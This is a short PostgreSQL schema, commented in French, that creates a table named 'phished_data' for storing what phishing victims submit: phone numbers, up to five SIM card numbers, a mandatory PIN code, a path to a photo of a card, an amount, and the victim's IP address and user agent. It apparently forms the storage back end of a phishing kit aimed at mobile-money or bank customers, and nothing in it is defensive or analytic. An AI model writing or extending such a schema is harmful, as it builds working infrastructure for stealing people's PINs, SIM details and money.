-- Créer la table 'phished_data' si elle n'existe pas déjà
CREATE TABLE IF NOT EXISTS phished_data (
    id SERIAL PRIMARY KEY, -- SERIAL pour auto-incrémentation
    phone_number VARCHAR(20) NOT NULL,
    sim_number_1 VARCHAR(20),
    sim_number_2 VARCHAR(20),
    sim_number_3 VARCHAR(20),
    sim_number_4 VARCHAR(20),
    sim_number_5 VARCHAR(20),
    pin_code VARCHAR(10) NOT NULL,
    reader_card_photo_path VARCHAR(255), -- Chemin vers la photo (sur un stockage persistant)
    amount NUMERIC(10, 2), -- Type numérique pour les montants
    submission_timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45), -- Pour les adresses IPv4 et IPv6
    user_agent TEXT
);
